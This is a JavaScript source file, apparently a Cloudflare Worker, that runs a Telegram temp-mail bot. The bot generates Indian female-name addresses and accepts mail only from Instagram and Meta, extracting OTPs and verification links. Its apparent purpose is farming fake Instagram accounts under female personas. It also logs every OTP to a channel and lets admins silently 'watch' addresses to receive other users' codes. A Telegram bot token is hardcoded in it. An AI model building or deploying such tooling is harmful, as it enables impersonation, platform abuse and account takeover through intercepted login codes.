/**
 * 100% Lag-Free Temp Mail Engine
 * Domain: vibepulsemedia.online
 */

const BOT_TOKEN = "8943075720:AAE4URhun0DS0yc38zUsHr1J2tGO3Kih3cA";
let PRIMARY_OWNER_ID = "8452322818";
const DB_CHANNEL_ID = "-1004474665956";
const DOMAIN = "vibepulsemedia.online";

let ADMINS = new Set([PRIMARY_OWNER_ID.toString()]);
let USER_SESSIONS = new Map();
let ADMIN_WATCHED_EMAILS = new Map();

// Strict Instagram & Meta Sender Filter
const ALLOWED_SENDERS = [
  "instagram.com",
  "mail.instagram.com",
  "facebookmail.com",
  "meta.com",
  "support.facebook.com",
  "meta.ai"
];

const FEMALE_NAMES = [
  "priya", "ananya", "sneha", "pooja", "neha", "riya", "simran", "kajal",
  "khushi", "aditi", "shreya", "tanvi", "mansi", "divya", "muskan", "aarushi",
  "ishika", "sakshi", "pallavi", "swati", "anjali", "kriti", "megha", "komal",
  "sonam", "preeti", "jyoti", "rekha", "payal", "varsha", "shikha", "nisha",
  "tanya", "deepika", "radhika", "monika", "garima", "ekta", "kavita", "saloni"
];

const SURNAMES = [
  "sharma", "verma", "singh", "patel", "kumar", "yadav", "gupta", "mishra",
  "tiwari", "pandey", "chauhan", "joshi", "jha", "mehta", "das", "dubey",
  "sen", "bose", "roy", "nair", "reddy", "kashyap", "bhardwaj", "saxena"
];

export default {
  // --- 1. WEBHOOK DISPATCHER ---
  async fetch(request, env, ctx) {
    if (request.method !== "POST") return new Response("OK", { status: 200 });

    try {
      const update = await request.json();

      // अगर यूजर ने बटन दबाया या मैसेज भेजा
      if (update.message) {
        ctx.waitUntil(handleIncoming(update.message));
      }

      // टेलीग्राम को तुरंत OK भेजो ताकि कोई भी लैग न रहे
      return new Response("OK", { status: 200 });
    } catch (err) {
      return new Response("OK", { status: 200 });
    }
  },

  // --- 2. EMAIL ROUTING (META/INSTAGRAM ONLY) ---
  async email(message, env, ctx) {
    try {
      const fromEmail = (message.from || "").toLowerCase().trim();
      const toEmail = (message.to || "").toLowerCase().trim();

      const isAllowed = ALLOWED_SENDERS.some(d => fromEmail.endsWith(d) || fromEmail.includes(d));
      if (!isAllowed) return; // बाकी सब ईमेल रिजेक्ट

      const rawStream = message.raw;
      const reader = rawStream.getReader();
      let rawContent = "";
      const decoder = new TextDecoder("utf-8");

      while (true) {
        const { done, value } = await reader.read();
        if (done) break;
        rawContent += decoder.decode(value, { stream: true });
      }

      const cleanBody = parseEmailContent(rawContent);

      // Deep 6-digit OTP Parser
      const otpRegex = /(?:code|otp|pin|security|código|passcode)[\s:=–-]{1,6}(\b\d{6}\b)/i;
      const otpMatch = cleanBody.match(otpRegex) || cleanBody.match(/\b\d{6}\b/);
      const extractedOtp = otpMatch ? (otpMatch[1] || otpMatch[0]) : null;

      // Link Extractor
      const linkRegex = /(https?:\/\/[^\s<>"{}|\\^`]+(?:instagram\.com|facebook\.com|meta\.com)[^\s<>"{}|\\^`]*)/i;
      const linkMatch = cleanBody.match(linkRegex);
      const verifyLink = linkMatch ? linkMatch[0] : null;

      let targetChatId = null;
      let isOldMail = false;

      if (ADMIN_WATCHED_EMAILS.has(toEmail)) {
        targetChatId = ADMIN_WATCHED_EMAILS.get(toEmail);
        isOldMail = true;
      } else if (USER_SESSIONS.has(toEmail)) {
        targetChatId = USER_SESSIONS.get(toEmail);
      } else {
        isOldMail = true;
      }

      // OTP डिलीवरी
      if (isOldMail) {
        for (const adminId of ADMINS) {
          await deliverOtpMessage(adminId, extractedOtp, toEmail, verifyLink);
        }
      } else if (targetChatId) {
        await deliverOtpMessage(targetChatId, extractedOtp, toEmail, verifyLink);
      }

      // चैनल लॉग
      if (DB_CHANNEL_ID) {
        await callTelegram("sendMessage", {
          chat_id: DB_CHANNEL_ID,
          text: `Log: \`${toEmail}\` | OTP: \`${extractedOtp || "Link"}\``,
          parse_mode: "Markdown"
        });
      }
    } catch (e) {
      console.error("Email Error: " + e.message);
    }
  }
};

// --- OTP कार्ड डिलीवरी ---
async function deliverOtpMessage(chatId, otp, toEmail, link) {
  let text = "";
  if (otp) {
    text = `🔐 *OTP:*\n\`${otp}\`\n\n_${toEmail}_`;
  } else {
    text = `Verification Link Received\n_${toEmail}_`;
  }

  let inlineButtons = [];
  if (link) {
    inlineButtons.push([{ text: "🌐 Open Link", url: link }]);
  }

  await callTelegram("sendMessage", {
    chat_id: chatId,
    text: text,
    parse_mode: "Markdown",
    reply_markup: inlineButtons.length > 0 ? { inline_keyboard: inlineButtons } : undefined
  });
}

// --- मैसेज एवं बटन हैंडलर ---
async function handleIncoming(msg) {
  const chatId = msg.chat.id.toString();
  const text = (msg.text || "").trim();
  const isOwner = (chatId === PRIMARY_OWNER_ID.toString());
  const isAdmin = ADMINS.has(chatId) || isOwner;

  // 1. Admin Commands
  if (text.startsWith("/transferowner") && isOwner) {
    const target = text.split(" ")[1];
    if (target && /^\d+$/.test(target)) {
      PRIMARY_OWNER_ID = target.trim();
      ADMINS.add(target.trim());
      await callTelegram("sendMessage", { chat_id: chatId, text: `👑 Owner set to: \`${target}\``, parse_mode: "Markdown" });
    }
    return;
  }

  if (text.startsWith("/addadmin") && isOwner) {
    const target = text.split(" ")[1];
    if (target && /^\d+$/.test(target)) {
      ADMINS.add(target.trim());
      await callTelegram("sendMessage", { chat_id: chatId, text: `✅ Added Admin: \`${target}\``, parse_mode: "Markdown" });
    }
    return;
  }

  if (text.startsWith("/watch") && isAdmin) {
    const target = text.split(" ")[1];
    if (target && target.includes("@")) {
      ADMIN_WATCHED_EMAILS.set(target.toLowerCase().trim(), chatId);
      await callTelegram("sendMessage", { chat_id: chatId, text: `🎯 Watching: \`${target.toLowerCase().trim()}\``, parse_mode: "Markdown" });
    }
    return;
  }

  // 2. मेन मेन्यू लोड करना
  if (text === "/start") {
    let keyboard = [
      [{ text: "⚡ Generate Email" }],
      [{ text: "🔄 Change Email" }]
    ];

    if (isAdmin) {
      keyboard.push([{ text: "🔑 Old Email Hub" }]);
    }

    await callTelegram("sendMessage", {
      chat_id: chatId,
      text: "⚡ *Temp Mail Portal*\n\nNeeche diye gaye button par tap karein:",
      parse_mode: "Markdown",
      reply_markup: {
        keyboard: keyboard,
        resize_keyboard: true,
        one_time_keyboard: false
      }
    });
    return;
  }

  // 3. बटन क्लिक: 'Generate Email' या 'Change Email'
  if (text === "⚡ Generate Email" || text === "🔄 Change Email" || text === "/gen") {
    const email = createPureFemaleAddress(chatId);
    
    // केवल और केवल ईमेल (कोई चैट आईडी नहीं, कोई फालतू टेक्स्ट नहीं)
    await callTelegram("sendMessage", {
      chat_id: chatId,
      text: `\`${email}\``,
      parse_mode: "Markdown"
    });
    return;
  }

  // 4. Admin Old Email Hub
  if (text === "🔑 Old Email Hub" && isAdmin) {
    await callTelegram("sendMessage", {
      chat_id: chatId,
      text: `Old Mail Monitor:\n\`/watch name@${DOMAIN}\``,
      parse_mode: "Markdown"
    });
    return;
  }
}

// लड़कियों के नाम वाला ईमेल (Zero Chat ID)
function createPureFemaleAddress(chatId) {
  const first = FEMALE_NAMES[(Math.random() * FEMALE_NAMES.length) | 0];
  const last = SURNAMES[(Math.random() * SURNAMES.length) | 0];
  const num = ((Math.random() * 900) | 0) + 100;
  const sep = Math.random() > 0.5 ? "." : "";
  const email = `${first}${sep}${last}${num}@${DOMAIN}`;

  USER_SESSIONS.set(email.toLowerCase(), chatId);
  return email;
}

function parseEmailContent(raw) {
  const parts = raw.split(/\r?\n\r?\n/);
  let text = parts.slice(1).join("\n\n");
  text = text.replace(/<style[^>]*>[\s\S]*?<\/style>/gi, "");
  text = text.replace(/<script[^>]*>[\s\S]*?<\/script>/gi, "");
  text = text.replace(/<[^>]+>/g, " ");
  text = text.replace(/&nbsp;/g, " ");
  text = text.replace(/&amp;/g, "&");
  text = text.replace(/&quot;/g, '"');
  text = text.replace(/&lt;/g, "<");
  text = text.replace(/&gt;/g, ">");
  text = text.replace(/=\r?\n/g, "");
  text = text.replace(/\s{2,}/g, " ").trim();
  return text;
}

async function callTelegram(method, payload) {
  try {
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
    return await res.json();
  } catch (e) {
    return null;
  }
}
